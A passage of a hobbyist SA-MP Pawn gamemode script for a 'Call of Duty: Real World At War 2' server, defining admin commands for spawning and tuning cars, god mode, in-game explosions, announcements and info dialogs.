	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 1 to use this command");
}

CMD:linkcar(playerid,params[]) {
	#pragma unused params
	if(IsPlayerInAnyVehicle(playerid)) {
    	LinkVehicleToInterior(GetPlayerVehicleID(playerid),GetPlayerInterior(playerid));
	    SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),GetPlayerVirtualWorld(playerid));
	    return SendClientMessage(playerid,lightblue, "Your vehicle is now in your virtual world and interior");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be in a vehicle.");
 }
CMD:savepos(playerid, params[])
{
if(IsPlayerConnected(playerid))
{
new Float:x,Float:y,Float:z;
new currentveh;
currentveh = GetPlayerVehicleID(playerid);
new Float:vehx, Float:vehy, Float:vehz;
if(IsPlayerInAnyVehicle(playerid)) return GetVehiclePos(currentveh, vehx, vehy, vehz);
{
GetPlayerPos(playerid,x,y,z);
SetPVarFloat(playerid,"xpos",x); // save X POS
SetPVarFloat(playerid,"ypos",y); // save Y POS
SetPVarFloat(playerid,"zpos",z); // save Z POS
SetPVarInt(playerid,"int",GetPlayerInterior(playerid));//get interior
SendClientMessage(playerid,0x33AA33AA,"Position Saved! Use /l To Get back To It!,");
}
}
return 1;
}
CMD:loadpos(playerid, params[])
{
new currentveh;
currentveh = GetPlayerVehicleID(playerid);
new Float:vehx, Float:vehy, Float:vehz;
if(IsPlayerInAnyVehicle(playerid)) return GetVehiclePos(currentveh, vehx, vehy, vehz);
{
SetPlayerPos(playerid, GetPVarFloat(playerid,"xpos"), GetPVarFloat(playerid,"ypos"), GetPVarFloat(playerid,"zpos"));
CreateVehicle(currentveh, GetPVarFloat(playerid,"xpos"), GetPVarFloat(playerid, "ypos"), GetPVarFloat(playerid,"zpos"),82.2873, 0, 1, 60);
SetPlayerInterior(playerid, GetPVarInt(playerid,"int"));
SendClientMessage(playerid, 0x33AA33AA, "Loaded Saved Position.");
}
return 1;
}
CMD:car(playerid,params[]) {
	if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
	    new tmp[256], tmp2[256], tmp3[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index); tmp3 = strtok(params,Index);
	    if(isnull(tmp)) return SendClientMessage(playerid, red, "JikyBot: Usage:/car [Modelid/Name] [colour1] [colour2]");
		new car, colour1, colour2, string[128];
   		if(!IsNumeric(tmp)) car = GetVehicleModelIDFromName(tmp); else car = strval(tmp);
		if(car < 400 || car > 611) return  SendClientMessage(playerid, red, "JikyBot: Invalid Vehicle Model");
		if(isnull(tmp2)) colour1 = random(126); else colour1 = strval(tmp2);
		if(!strlen(tmp3)) colour2 = random(126); else colour2 = strval(tmp3);
		if(PlayerInfo[playerid][pCar] != -1 && !IsPlayerAdmin(playerid) ) CarDeleter(PlayerInfo[playerid][pCar]);
		new LVehicleID,Float:X,Float:Y,Float:Z, Float:Angle,int1;	GetPlayerPos(playerid, X,Y,Z);	GetPlayerFacingAngle(playerid,Angle);   int1 = GetPlayerInterior(playerid);
		LVehicleID = CreateVehicle(car, X+3,Y,Z, Angle, colour1, colour2, -1); LinkVehicleToInterior(LVehicleID,int1); PutPlayerInVehicle(playerid, LVehicleID, 0);
		PlayerInfo[playerid][pCar] = LVehicleID;
		CMDMessageToAdmins(playerid,"CAR");
		format(string, sizeof(string), "%s spawned a \"%s\" (Model:%d) colour (%d, %d), at %0.2f, %0.2f, %0.2f", pName(playerid), VehicleNames[car-400], car, colour1, colour2, X, Y, Z);
        SaveToFile("CarSpawns",string);
		format(string, sizeof(string), "You have spawned a \"%s\" (Model:%d) colour (%d, %d)", VehicleNames[car-400], car, colour1, colour2);
		return SendClientMessage(playerid,lightblue, string);
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 3 to use this command");
}

CMD:carhealth(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/carhealth [playerid] [amount]");
		new player1 = strval(tmp), health = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
            if(IsPlayerInAnyVehicle(player1)) {
		       	CMDMessageToAdmins(playerid,"CARHEALTH");
				format(string, sizeof(string), "You have set \"%s's\" vehicle health to '%d", pName(player1), health); SendClientMessage(playerid,blue,string);
				if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your vehicle's health to '%d'", pName(playerid), health); SendClientMessage(player1,blue,string); }
   				return SetVehicleHealth(GetPlayerVehicleID(player1), health);
			} else return SendClientMessage(playerid,red,"JikyBot: Player is not in a vehicle");
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:times(playerid, params[])
{
    new String[100];
	format(String,sizeof(String), "Time left for Anthrax: %d Seconds", anthrax_time);
	SendClientMessage(playerid, COLOR_ORANGE,String);
	format(String,sizeof(String), "Time left for nuke: %d Seconds", nuke_time);
	SendClientMessage(playerid, COLOR_ORANGE,String);
	return 1;
}

CMD:carcolour(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], tmp3[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index); tmp3 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !strlen(tmp3) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/carcolour [playerid] [colour1] [colour2]");
		new player1 = strval(tmp), colour1, colour2, string[128];
		if(isnull(tmp2)) colour1 = random(126); else colour1 = strval(tmp2);
		if(!strlen(tmp3)) colour2 = random(126); else colour2 = strval(tmp3);
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
            if(IsPlayerInAnyVehicle(player1)) {
		       	CMDMessageToAdmins(playerid,"CARCOLOUR");
				format(string, sizeof(string), "You have changed the colour of \"%s's\" %s to '%d,%d'", pName(player1), VehicleNames[GetVehicleModel(GetPlayerVehicleID(player1))-400], colour1, colour2 ); SendClientMessage(playerid,blue,string);
				if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has changed the colour of your %s to '%d,%d''", pName(playerid), VehicleNames[GetVehicleModel(GetPlayerVehicleID(player1))-400], colour1, colour2 ); SendClientMessage(player1,blue,string); }
   				return ChangeVehicleColor(GetPlayerVehicleID(player1), colour1, colour2);
			} else return SendClientMessage(playerid,red,"JikyBot: Player is not in a vehicle");
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:god(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
    	if(PlayerInfo[playerid][God] == 0)	{
   	    	PlayerInfo[playerid][God] = 1;
    	    SetPlayerHealth(playerid,100000);
			GivePlayerWeapon(playerid,16,50000);
		    GivePlayerWeapon(playerid,26,50000);
           	SendClientMessage(playerid,green,"GODMODE ON");
           	PlayAudioStreamForPlayer(playerid, "http://picosong.com/media/songs/612442fce96745dc3e0562ff397ba25e/godlike.mp3");
			return CMDMessageToAdmins(playerid,"GOD");
		} else {
   	        PlayerInfo[playerid][God] = 0;
       	    SendClientMessage(playerid,red,"GODMODE OFF");
        	SetPlayerHealth(playerid, 100);
		} return GivePlayerWeapon(playerid,35,0);
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 4 to use this command");
}

CMD:sgod(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
   		if(PlayerInfo[playerid][God] == 0)	{
        	PlayerInfo[playerid][God] = 1;
	        SetPlayerHealth(playerid,100000);
			GivePlayerWeapon(playerid,16,50000); GivePlayerWeapon(playerid,26,50000);
			PlayAudioStreamForPlayer(playerid, "http://picosong.com/media/songs/612442fce96745dc3e0562ff397ba25e/godlike.mp3");
            return SendClientMessage(playerid,green,"GODMODE ON");
		} else	{
   	        PlayerInfo[playerid][God] = 0;
            SendClientMessage(playerid,red,"GODMODE OFF");
	        SetPlayerHealth(playerid, 100); return GivePlayerWeapon(playerid,35,0);	}
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 6 to use this command");
}

CMD:godcar(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
		if(IsPlayerInAnyVehicle(playerid)) {
	    	if(PlayerInfo[playerid][GodCar] == 0) {
        		PlayerInfo[playerid][GodCar] = 1;
   				CMDMessageToAdmins(playerid,"GODCAR");
                  SetVehicleHealth(VID[playerid], 9999999999.0);
            	return SendClientMessage(playerid,green,"GODCARMODE ON");
			} else {
	            PlayerInfo[playerid][GodCar] = 0;
    	        return SendClientMessage(playerid,red,"GODCARMODE OFF"); }
		} else return SendClientMessage(playerid,red,"JikyBot: You need to be in a car to use this command");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:die(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 4 || IsPlayerAdmin(playerid)) {
		new Float:x, Float:y, Float:z ;
		GetPlayerPos( playerid, Float:x, Float:y, Float:z );
		CreateExplosion(Float:x+10, Float:y, Float:z, 8,10.0);
		CreateExplosion(Float:x-10, Float:y, Float:z, 8,10.0);
		CreateExplosion(Float:x, Float:y+10, Float:z, 8,10.0);
		CreateExplosion(Float:x, Float:y-10, Float:z, 8,10.0);
		CreateExplosion(Float:x+10, Float:y+10, Float:z, 8,10.0);
		CreateExplosion(Float:x-10, Float:y+10, Float:z, 8,10.0);
		return CreateExplosion(Float:x-10, Float:y-10, Float:z, 8,10.0);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:getid(playerid,params[]) {
	if(isnull(params)) return SendClientMessage(playerid,blue,"Correct JikyBot: Usage:/getid [part of nick]");
	new found, string[128], playername[MAX_PLAYER_NAME];
	format(string,sizeof(string),"Searched for: \"%s\" ",params);
	SendClientMessage(playerid,blue,string);
	foreach(Player, i)
	{
		if(IsPlayerConnected(i))
		{
	  		GetPlayerName(i, playername, MAX_PLAYER_NAME);
			new namelen = strlen(playername);
			new bool:searched=false;
	    	for(new pos=0; pos <= namelen; pos++)
			{
				if(searched != true)
				{
					if(strfind(playername,params,true) == pos)
					{
		                found++;
						format(string,sizeof(string),"%d. %s (ID %d)",found,playername,i);
						SendClientMessage(playerid, green ,string);
						searched = true;
					}
				}
			}
		}
	}
	if(found == 0) SendClientMessage(playerid, lightblue, "No players have this in their nick");
	return 1;
}
CMD:msay(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 1) {
 		if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/osay [text]");
		new string[128]; format(string, sizeof(string), "*Moderator %s: %s", PlayerName2(playerid), params[0] );
		return SendClientMessageToAll(COLOR_PINK,string);
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be Server Tester to use this command");
}
CMD:asay(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 2) {
 		if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/asay [text]");
		new string[128]; format(string, sizeof(string), "***Admin %s: %s", PlayerName2(playerid), params[0] );
		return SendClientMessageToAll(COLOR_PINK,string);
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 1 to use this command");
}
CMD:bsay(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 5) {
 		if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/asay [text]");
		new string[128];
		format(string,sizeof(string),"Wizard Dumbledore(1338): %s",params[0]);
		return SendClientMessageToAll(0xFFFF00FF,string);
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 1 to use this command");
}

CMD:tsay(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Helper] == 1) {
 		if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/osay [text]");
		new string[128]; format(string, sizeof(string), "*Server Tester %s: %s", PlayerName2(playerid), params[0] );
		return SendClientMessageToAll(COLOR_PINK,string);
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be Server Tester to use this command");
}

CMD:highlight(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid,red,"JikyBot: Usage:/highlight [playerid]");
	    new player1, playername[MAX_PLAYER_NAME], string[128];
	    player1 = strval(params);

	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
		 	GetPlayerName(player1, playername, sizeof(playername));
	 	    if(PlayerInfo[player1][blip] == 0) {
				CMDMessageToAdmins(playerid,"HIGHLIGHT");
				PlayerInfo[player1][pColour] = GetPlayerColor(player1);
				PlayerInfo[player1][blip] = 1;
				BlipTimer[player1] = SetTimerEx("HighLight", 1000, 1, "i", player1);
				format(string,sizeof(string),"You have highlighted %s's marker", playername);
			} else {
				KillTimer( BlipTimer[player1] );
				PlayerInfo[player1][blip] = 0;
				SetPlayerColor(player1, PlayerInfo[player1][pColour] );
				format(string,sizeof(string),"You have stopped highlighting %s's marker", playername);
			}
			return SendClientMessage(playerid,blue,string);
		} else return SendClientMessage(playerid, red, "Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:setgravity(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 9) {
	    if(isnull(params)||!(strval(params)<=50&&strval(params)>=-50)) return SendClientMessage(playerid,red,"JikyBot: Usage:/setgravity <-50.0 - 50.0>");
        CMDMessageToAdmins(playerid,"SETGRAVITY");
		new string[128],adminname[MAX_PLAYER_NAME]; GetPlayerName(playerid, adminname, sizeof(adminname)); new Float:Gravity = floatstr(params);format(string,sizeof(string),"Admnistrator %s has set the gravity to %f",adminname,Gravity);
		SetGravity(Gravity); return SendClientMessageToAll(blue,string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:serverinfo(playerid,params[]) {
	#pragma unused params
    new TotalVehicles = CreateVehicle(411, 0, 0, 0, 0, 0, 0, 1000);    DestroyVehicle(TotalVehicles);
	new numo = CreateDynamicObject(1245,0,0,1000,0,0,0);	DestroyObject(numo);
	new nump = CreatePickup(371,2,0,0,1000);	DestroyPickup(nump);
	new gz = GangZoneCreate(3,3,5,5);	GangZoneDestroy(gz);

	new model[250], nummodel;
	for(new i=1;i<TotalVehicles;i++) model[GetVehicleModel(i)-400]++;
	for(new i=0;i<250;i++)	if(model[i]!=0)	nummodel++;

	new string[256];
	format(string,sizeof(string),"Server Info: [ Players Connected: %d || Maximum Players: %d ] [Ratio %0.2f ]",ConnectedPlayers(),GetMaxPlayers(),Float:ConnectedPlayers() / Float:GetMaxPlayers() );
	SendClientMessage(playerid,green,string);
	format(string,sizeof(string),"Server Info: [ Vehicles: %d || Models %d || Players In Vehicle: %d || InCar %d / OnBike %d ]",TotalVehicles-1,nummodel, InVehCount(),InCarCount(),OnBikeCount() );
	SendClientMessage(playerid,green,string);
	format(string,sizeof(string),"Server Info: [ Objects: %d || Pickups %d || Gangzones %d ]",numo-1, nump, gz);
	SendClientMessage(playerid,green,string);
	format(string,sizeof(string),"Server Info: [ Players In Jail %d || Players Frozen %d || Muted %d ]",JailedPlayers(),FrozenPlayers(), MutedPlayers() );
	return SendClientMessage(playerid,green,string);
}

CMD:announce(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 4 || IsPlayerAdmin(playerid)) {
    	if(isnull(params)) return SendClientMessage(playerid,red,"JikyBot: Usage:/announce <text>");
    	CMDMessageToAdmins(playerid,"ANNOUNCE");
		return GameTextForAll(params,4000,3);
    } else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}


CMD:infobeast(playerid,params[])
{
if(PlayerInfo[playerid][Level] >= 0) {
    ShowPlayerDialog(playerid, 804, DIALOG_STYLE_MSGBOX, "{0000FF}COD-Real World At War 2 Website:", "{FF00FF}|----------= XP-COD-RWW2: =----------|\nxenon-extreme.com\n{FF00FF}|----------= Facebook Website Of Perfect_Boy =--------|\nwww.facebook.com/srijan.suresh\n{66FFFF}Gmail of Perfect_Boy\nsrijans25@gmail.com\nThis Script Made Exclusively By Perfect_Boy\n\nXenon Pro Gaming\n\n{0000FF}Call Of Duty : Real World At War 2 V10.9.6 ", "Okay", "Back");
return 1;
}
return 0;
}

CMD:swinfo(playerid,params[])
{
if(PlayerInfo[playerid][Level] >= 0) {
ShowPlayerDialog(playerid, 803, DIALOG_STYLE_MSGBOX, "{FF0000}COD-Real World At War 2", "{0000FF}WElcome to COD RWW2 By Perfect_Boy\nThis Is the New version of RWW2 By Perfect_Boy\nNever Ask For Admin level, score And Cash With online Admins\nVisit us At xenon-extreme.com\nNever Disrespect or Use Discouraging Words to anyone\nCall Of Duty : Real World At War 2 V10.9.6 ", "Okay", "Back");
return 1;
}
return 0;
}

CMD:site(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
    	CMDMessageToAdmins(playerid,"SITE");
    	SendClientMessageToAll(0xFF8DCC55,".::Visit our Website: xenon-extreme.com !::.");
		return GameTextForAll("~n~~b~~h~      serverwebsite:~n~~g~~h~~>~xenon-extreme.com~<~",5000,5);
    } else return SendClientMessage(playerid,red,"JikyBot: You need to be level 1 to use this command");
}
CMD:announce2(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 4 || IsPlayerAdmin(playerid)) {
        new tmp[256], tmp2[256], tmp3[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index) ,tmp3 = strtok(params,Index);
	    if(isnull(tmp)||isnull(tmp2)||!strlen(tmp3)) return SendClientMessage(playerid,red,"JikyBot: Usage:/announce <style> <time> <text>");
		if(!(strval(tmp) >= 0 && strval(tmp) <= 6) || strval(tmp) == 2)	return SendClientMessage(playerid,red,"JikyBot: Invalid gametext style. Range: 0 - 6");
		CMDMessageToAdmins(playerid,"ANNOUNCE2");
		return GameTextForAll(params[(strlen(tmp)+strlen(tmp2)+2)], strval(tmp2), strval(tmp));
    } else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:ann(playerid,params[]) {
	return cmd_announce(playerid, params);
}

CMD:ann2(playerid,params[]) {
	return cmd_announce2(playerid, params);
}
CMD:lslowmo(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 5) {
		new Float:x, Float:y, Float:z; GetPlayerPos(playerid, x, y, z); CreatePickup(1241, 4, x, y, z);
		return CMDMessageToAdmins(playerid,"LSLOWMO");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:jetpack(playerid,params[]) {
    if(isnull(params))	{
    	if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
			SendClientMessage(playerid,blue,"Jetpack Spawned.");
			CMDMessageToAdmins(playerid,"JETPACK");
			return SetPlayerSpecialAction(playerid, 2);
		} else return SendClientMessage(playerid,red,"JikyBot: You need to be on adminduty to use this command");
	} else {
	    new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
    	player1 = strval(params);
		if(PlayerInfo[playerid][Level] >= 4)	{
		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid)	{
				CMDMessageToAdmins(playerid,"JETPACK");		SetPlayerSpecialAction(player1, 2);
				GetPlayerName(player1, playername, sizeof(playername));		GetPlayerName(playerid, adminname, sizeof(adminname));
				format(string,sizeof(string),"Administrator \"%s\" has given you a jetpack",adminname); SendClientMessage(player1,blue,string);
				format(string,sizeof(string),"You have given %s a jetpack", playername);
				return SendClientMessage(playerid,blue,string);
			} else return SendClientMessage(playerid, red, "Player is not connected or is yourself");
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	}
}

CMD:flip(playerid,params[]) {
    if(PlayerInfo[playerid][OnDuty] >= 1|| IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8) {
	    if(isnull(params)) {
		    if(IsPlayerInAnyVehicle(playerid)) {
			new VehicleID, Float:X, Float:Y, Float:Z, Float:Angle; GetPlayerPos(playerid, X, Y, Z); VehicleID = GetPlayerVehicleID(playerid);
			GetVehicleZAngle(VehicleID, Angle);	SetVehiclePos(VehicleID, X, Y, Z); SetVehicleZAngle(VehicleID, Angle); SetVehicleHealth(VehicleID,1000.0);
			CMDMessageToAdmins(playerid,"FLIP"); return SendClientMessage(playerid, blue,"Vehicle Flipped. You can also do /flip [playerid]");
			} else return SendClientMessage(playerid,red,"JikyBot: You are not in a vehicle. You can also do /flip [playerid]");
		}
	    new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
	    player1 = strval(params);

	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid) {
			CMDMessageToAdmins(playerid,"FLIP");
			if (IsPlayerInAnyVehicle(player1)) {
				new VehicleID, Float:X, Float:Y, Float:Z, Float:Angle; GetPlayerPos(player1, X, Y, Z); VehicleID = GetPlayerVehicleID(player1);
				GetVehicleZAngle(VehicleID, Angle);	SetVehiclePos(VehicleID, X, Y, Z); SetVehicleZAngle(VehicleID, Angle); SetVehicleHealth(VehicleID,1000.0);
				CMDMessageToAdmins(playerid,"FLIP");
				GetPlayerName(player1, playername, sizeof(playername));		GetPlayerName(playerid, adminname, sizeof(adminname));
				format(string,sizeof(string),"Administrator %s flipped your vehicle",adminname); SendClientMessage(player1,blue,string);
				format(string,sizeof(string),"You have flipped %s's vehicle", playername);
				return SendClientMessage(playerid, blue,string);
			} else return SendClientMessage(playerid,red,"JikyBot: This player isn't in a vehicle");
		} else return SendClientMessage(playerid, red, "Player is not connected or is yourself");
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be on adminduty to use this command");
}

CMD:destroycar(playerid,params[]) {
	#pragma unused params
	CMDMessageToAdmins(playerid,"DV");
	if(PlayerInfo[playerid][Level] >= 5) return EraseVehicle(GetPlayerVehicleID(playerid));
	else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:ltc(playerid,params[])
{
	if(PlayerInfo[playerid][OnDuty] >= 1 || IsPlayerAdmin(playerid) || PlayerInfo[playerid][Level] >= 8)
	{
		if(!IsPlayerInAnyVehicle(playerid))
		{
		    new cid;
		    if(sscanf(params,"d",cid)) return SendClientMessage(playerid, RED,"Please use:/ltc [1-13]");
            new Float:X,Float:Y,Float:Z,Float:Angle,LVehicleIDt;
			GetPlayerPos(playerid,X,Y,Z);
			GetPlayerFacingAngle(playerid,Angle);
  			switch(cid)
			{
			    case 1:
			    {
			        LVehicleIDt = CreateVehicle(560,X,Y,Z,Angle,1,-1,-1);
					PutPlayerInVehicle(playerid,LVehicleIDt,0);
					AddVehicleComponent(LVehicleIDt, 1028);	AddVehicleComponent(LVehicleIDt, 1030);	AddVehicleComponent(LVehicleIDt, 1031);	AddVehicleComponent(LVehicleIDt, 1138);
					AddVehicleComponent(LVehicleIDt, 1140);  AddVehicleComponent(LVehicleIDt, 1170);
				    AddVehicleComponent(LVehicleIDt, 1028);	AddVehicleComponent(LVehicleIDt, 1030);	AddVehicleComponent(LVehicleIDt, 1031);	AddVehicleComponent(LVehicleIDt, 1138);	AddVehicleComponent(LVehicleIDt, 1140);  AddVehicleComponent(LVehicleIDt, 1170);
				    AddVehicleComponent(LVehicleIDt, 1080);	AddVehicleComponent(LVehicleIDt, 1086); AddVehicleComponent(LVehicleIDt, 1087); AddVehicleComponent(LVehicleIDt, 1010);	PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	ChangeVehiclePaintjob(LVehicleIDt,0);
			   	   	SetVehicleVirtualWorld(LVehicleIDt, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(LVehicleIDt, GetPlayerInterior(playerid));
					PlayerInfo[playerid][pCar] = LVehicleIDt;
				}
				case 2:
				{
			        LVehicleIDt = CreateVehicle(560,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,LVehicleIDt,0); CMDMessageToAdmins(playerid,"LTunedCar");	    AddVehicleComponent(LVehicleIDt, 1028);	AddVehicleComponent(LVehicleIDt, 1030);	AddVehicleComponent(LVehicleIDt, 1031);	AddVehicleComponent(LVehicleIDt, 1138);	AddVehicleComponent(LVehicleIDt, 1140);  AddVehicleComponent(LVehicleIDt, 1170);
				    AddVehicleComponent(LVehicleIDt, 1028);	AddVehicleComponent(LVehicleIDt, 1030);	AddVehicleComponent(LVehicleIDt, 1031);	AddVehicleComponent(LVehicleIDt, 1138);	AddVehicleComponent(LVehicleIDt, 1140);  AddVehicleComponent(LVehicleIDt, 1170);
				    AddVehicleComponent(LVehicleIDt, 1080);	AddVehicleComponent(LVehicleIDt, 1086); AddVehicleComponent(LVehicleIDt, 1087); AddVehicleComponent(LVehicleIDt, 1010);	PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	ChangeVehiclePaintjob(LVehicleIDt,1);
				   	SetVehicleVirtualWorld(LVehicleIDt, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(LVehicleIDt, GetPlayerInterior(playerid));
					PlayerInfo[playerid][pCar] = LVehicleIDt;
				}
				case 3:
				{

	           		LVehicleIDt = CreateVehicle(560,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,LVehicleIDt,0); CMDMessageToAdmins(playerid,"LTunedCar");	    AddVehicleComponent(LVehicleIDt, 1028);	AddVehicleComponent(LVehicleIDt, 1030);	AddVehicleComponent(LVehicleIDt, 1031);	AddVehicleComponent(LVehicleIDt, 1138);	AddVehicleComponent(LVehicleIDt, 1140);  AddVehicleComponent(LVehicleIDt, 1170);
					AddVehicleComponent(LVehicleIDt, 1080);	AddVehicleComponent(LVehicleIDt, 1086); AddVehicleComponent(LVehicleIDt, 1087); AddVehicleComponent(LVehicleIDt, 1010);	PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	ChangeVehiclePaintjob(LVehicleIDt,2);
	   				SetVehicleVirtualWorld(LVehicleIDt, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(LVehicleIDt, GetPlayerInterior(playerid));
					PlayerInfo[playerid][pCar] = LVehicleIDt;
				}
	            case 4:
	            {
			        LVehicleIDt = CreateVehicle(559,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,LVehicleIDt,0); CMDMessageToAdmins(playerid,"LTunedCar");
			    	AddVehicleComponent(LVehicleIDt,1065);    AddVehicleComponent(LVehicleIDt,1067);    AddVehicleComponent(LVehicleIDt,1162); AddVehicleComponent(LVehicleIDt,1010); AddVehicleComponent(LVehicleIDt,1073);	ChangeVehiclePaintjob(LVehicleIDt,1);
				   	SetVehicleVirtualWorld(LVehicleIDt, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(LVehicleIDt, GetPlayerInterior(playerid));
					PlayerInfo[playerid][pCar] = LVehicleIDt;
				}
				case 5:
				{
			        LVehicleIDt = CreateVehicle(565,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,LVehicleIDt,0); CMDMessageToAdmins(playerid,"LTunedCar");
				    AddVehicleComponent(LVehicleIDt,1046); AddVehicleComponent(LVehicleIDt,1049); AddVehicleComponent(LVehicleIDt,1053); AddVehicleComponent(LVehicleIDt,1010); AddVehicleComponent(LVehicleIDt,1073); ChangeVehiclePaintjob(LVehicleIDt,1);
				   	SetVehicleVirtualWorld(LVehicleIDt, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(LVehicleIDt, GetPlayerInterior(playerid));
					PlayerInfo[playerid][pCar] = LVehicleIDt;
				}
				case 6:
				{
			        LVehicleIDt = CreateVehicle(558,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,LVehicleIDt,0); CMDMessageToAdmins(playerid,"LTunedCar");
			    	AddVehicleComponent(LVehicleIDt,1088); AddVehicleComponent(LVehicleIDt,1092); AddVehicleComponent(LVehicleIDt,1139); AddVehicleComponent(LVehicleIDt,1010); AddVehicleComponent(LVehicleIDt,1073); ChangeVehiclePaintjob(LVehicleIDt,1);
			 	   	SetVehicleVirtualWorld(LVehicleIDt, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(LVehicleIDt, GetPlayerInterior(playerid));
					PlayerInfo[playerid][pCar] = LVehicleIDt;
				}
	            case 7:
	            {
			        LVehicleIDt = CreateVehicle(561,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,LVehicleIDt,0); CMDMessageToAdmins(playerid,"LTunedCar");
